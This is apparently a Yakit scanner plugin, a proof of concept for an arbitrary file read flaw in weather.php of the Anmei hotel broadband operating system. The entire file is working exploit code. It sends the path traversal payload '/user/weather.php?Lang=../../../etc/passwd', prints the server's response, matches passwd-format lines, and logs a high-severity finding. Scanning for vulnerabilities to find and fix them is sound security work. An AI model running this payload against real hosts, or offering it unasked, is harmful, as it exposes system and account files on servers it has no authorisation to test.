yakit.AutoInitYakit()

handleCheck = func(target, port, payload) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet = `
GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
`
    println(payload)
    rsp, req, _ = poc.HTTP(
        packet, 
        poc.params({"target": addr, "payload": payload}), 
        poc.https(isTls), 
        poc.redirectTimes(0), 
    )
    // dump(rsp)
    if len(rsp) > 0 {
        println(string(rsp))
        if str.MatchAllOfRegexp(
            rsp, 
            `(\w[\w-]+\:(!|\*|[^:]+)\:\d+\:\d+:[^:]*\:[^:]*\:[^\r^\n]*(\r?\n|\r|)){3}`, 
        ) && str.MatchAllOfSubString(rsp, `HTTP/1.1 200 OK`) {
            yakit.Info(
                "%v found 安美数字酒店宽带运营系统weather.php任意文件读取漏洞", 
                addr, 
            )
            risk.NewRisk(
                addr, 
                risk.title("安美数字酒店宽带运营系统weather.php任意文件读取漏洞"), 
                risk.severity("high"), 
                risk.titleVerbose("安美数字酒店宽带运营系统weather.php任意文件读取漏洞"), 
                risk.request(string(req)), 
                risk.response(string(rsp)), 
                risk.cve("no cve"), 
            )
        } else {
            println("不存在安美数字酒店宽带运营系统weather.php任意文件读取漏洞")
        }

    }


    return
}
handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen() {
        return
    }

    payload = `/user/weather.php?Lang=../../../etc/passwd`

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port, payload)
    }

}
